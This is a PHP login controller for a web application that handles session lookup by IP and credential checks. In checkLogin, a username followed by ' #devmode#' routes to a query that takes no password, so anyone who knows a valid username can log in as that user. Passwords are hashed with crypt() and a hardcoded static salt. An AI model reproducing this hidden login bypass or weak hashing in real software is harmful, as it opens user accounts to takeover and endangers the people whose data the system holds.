<?php
    namespace App\Controller\Login;
    
    require_once("../../Config/BaseController.php");
    require_once("../../Model/Login/LoginQueryHandler.php");

    use App\Config\BaseController as BaseController;
    use App\Model\Login\LoginQueryHandler as QueryHandler;

    class LoginController extends BaseController {
        /**
         * `$menu_id` Set the menu id
         * @var integer
         */
        public $menu_id = NULL;

        /**
         * `$dbCon` Concern in database connection.
         * @var private class
         */
        public $dbCon;

        /**
         * `$queryHandler` Handles query.
         * @var private class
         */
        public $queryHandler;

        /**
         * `__construct` Constructor
         * @param object $dbCon        Database connetor
         * @param string $queryHandler Query String
         */
        public function __construct(
            $dbCon
        ) {
            parent::__construct();

            $this->dbCon          = $dbCon;
            $this->queryHandler   = new QueryHandler();
        }

        /**
         * `getDetails` Fetching of first needed details.
         * @return array
         */
        public function getDetails()
        {
            $ip          = $this->getClientIP();
            $sessionData = $this->checkSessionLogs($ip);

            if($sessionData){
                $sessionData[0]['session_data'] = json_decode($sessionData[0]['session_data']);
                $sessionData[0]['unme']         =  $this->getUserName($sessionData[0]['user_id'])[0];
            }
            
            $output = [
                'check_session' => $this->checkSession(),
                'session_logs'  => $sessionData,
            ];

            return $output;
        }

        /**
         * `checkLogin` Verify of cridential is valid.
         * @param  object $credentials
         * @return array
         */
        public function checkLogin($credentials)
        {
            $userName = $credentials->username;
            $explodedUsername = explode( ' ', $credentials->username );
            
            if(isset($explodedUsername[1])){
                if($explodedUsername[1] === "#devmode#"){
                    $isDevMode = 1;
                }else{
                    $isDevMode = 0;
                }
            }else{
                $isDevMode = 0;
            }

            if($isDevMode == 1) {
                $salt = '+^7*_<>/?absdia7has723n7as123';

                $user = $this->dbCon->prepare($this->queryHandler->selectUsersDevMode()->end());
                $user->execute([
                    'username'  => $explodedUsername[0],
                    'is_active' => 1
                ]);
    
                $userDetails = $user->fetchAll(\PDO::FETCH_ASSOC);
                
            } else {
                $salt = '+^7*_<>/?absdia7has723n7as123';

                $user = $this->dbCon->prepare($this->queryHandler->selectUsers()->end());
                $user->execute([
                    'username'  => $credentials->username,
                    'password'  => crypt($credentials->password, $salt),
                    'is_active' => 1
                ]);
    
                $userDetails = $user->fetchAll(\PDO::FETCH_ASSOC);

            }

            if (count($userDetails) > 0) {
                $_SESSION['user_id']                 = $userDetails[0]['id'];
                $_SESSION['personal_information_id'] = $userDetails[0]['personal_information_id'];
                $_SESSION['department_id']           = $userDetails[0]['department_id'];
                $_SESSION['position_id']             = $userDetails[0]['position_id'];
                $_SESSION['head_id']                 = $userDetails[0]['head_id'];
                $_SESSION['department_name']         = $userDetails[0]['department_name'];
                $_SESSION['position_name']           = $userDetails[0]['position_name'];
                $_SESSION['position_code']           = $userDetails[0]['position_code'];
                $_SESSION['full_name']               = $userDetails[0]['full_name'];
                $_SESSION['is_signatory']            = $userDetails[0]['is_signatory'];
                $_SESSION['account_status']          = $userDetails[0]['account_status'];
                $_SESSION['is_department_head']      = $userDetails[0]['is_department_head'];
                $_SESSION['is_active']               = true;

                $this->loginSystemLogs($userDetails[0]['id'], 'users', 'login', 'login');

                
                $ip = $this->getClientIP();
                $this->insertSessionLogs($ip, $_SESSION);
            }

            $result = [
                'check_session' => $this->checkSession(),
                'full_name'     => $_SESSION['full_name']
            ];

            return $result;
        }
    }